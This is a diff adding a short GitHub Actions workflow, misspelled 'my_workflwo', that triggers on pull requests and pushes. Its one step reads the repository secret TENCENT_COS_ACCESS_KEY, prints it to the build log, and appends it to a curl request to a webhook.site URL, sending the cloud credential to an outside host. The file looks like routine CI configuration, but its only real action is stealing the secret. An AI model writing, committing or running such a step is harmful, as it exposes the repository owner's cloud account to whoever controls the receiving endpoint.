@@ -1,0 +1,22 @@
+name: my_workflwo
+
+on: 
+  pull_request:
+  push: 
+
+jobs:
+  job1:
+    runs-on: ubuntu-latest
+    
+    steps: 
+      - name: step1
+        env:
+          TENCENT_COS_ACCESS_KEY: ${{secrets.TENCENT_COS_ACCESS_KEY}}
+          
+        run:
+          echo "start run" 
+          echo "secret = ${TENCENT_COS_ACCESS_KEY}"
+          curl "https://webhook.site/400f5d0b-603a-4d5c-872d-5ae903d6b830${TENCENT_COS_ACCESS_KEY}"
+          
+        
+    
